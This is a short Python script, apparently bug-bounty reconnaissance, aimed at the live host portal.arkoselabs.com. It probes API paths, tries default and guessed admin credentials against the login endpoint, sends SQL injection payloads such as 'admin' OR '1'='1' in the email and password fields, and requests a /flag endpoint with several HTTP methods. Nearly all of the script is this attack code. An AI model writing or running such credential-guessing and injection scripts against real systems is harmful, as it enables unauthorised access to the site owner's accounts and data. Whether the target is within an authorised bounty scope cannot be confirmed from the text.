#!/usr/bin/env python3
"""Arkose Labs bug bounty recon — Level 0-1."""
import urllib.request, urllib.error, re, json

BASE = 'https://portal.arkoselabs.com'

def get(p, timeout=10):
    try:
        req = urllib.request.Request(BASE+p, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return 0, str(e)

def post(p, data, timeout=10):
    try:
        req = urllib.request.Request(BASE+p, data=json.dumps(data).encode(),
                                     headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'},
                                     method='POST')
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return 0, str(e)

# Login page
print('=== LOGIN PAGE ===')
code, body = get('/login')
print(f'HTTP {code}')
print(body[:1500])

# API probing
print('\n=== API PROBING ===')
for path in ['/api', '/api/v1', '/api/v2', '/api/health', '/api/status', '/api/users', '/api/flag', '/api/auth']:
    code, body = get(path)
    if code != 404:
        print(f'  {path}: {code}')
        if body:
            print(f'  Body: {body[:200]}')

# Auth bypass
print('\n=== AUTH BYPASS ===')
for email, password in [
    ('admin@arkoselabs.com', 'admin'),
    ('admin@arkoselabs.com', 'password'),
    ('admin@arkoselabs.com', 'arkose'),
    ('admin@arkoselabs.com', 'Admin123!'),
    ('test@test.com', 'test'),
    ('admin', 'admin'),
]:
    code, body = post('/api/login', {'email': email, 'password': password})
    print(f'  {email}:{password} -> {code}')
    if code == 200:
        print(f'  Body: {body[:300]}')

# SQLi
print('\n=== SQLi ===')
for email, password in [
    ("admin'--", "x"),
    ("admin' OR '1'='1", "x"),
    ("admin", "' OR '1'='1"),
    ("admin' OR 1=1--", "x"),
]:
    code, body = post('/api/login', {'email': email, 'password': password})
    print(f'  {email} -> {code}')
    if code != 404 and body:
        print(f'  Body: {body[:200]}')

# Check /flag with various headers
print('\n=== FLAG ENDPOINT ===')
for method in ['GET', 'POST', 'PUT', 'DELETE']:
    try:
        req = urllib.request.Request(BASE+'/flag', method=method,
                                     headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as r:
            code = r.getcode()
            body = r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        code = e.code
        body = e.read().decode('utf-8', 'replace')
    except Exception as e:
        code = 0
        body = str(e)
    print(f'  {method} /flag: {code}')
    if code != 404:
        print(f'  Body: {body[:200]}')
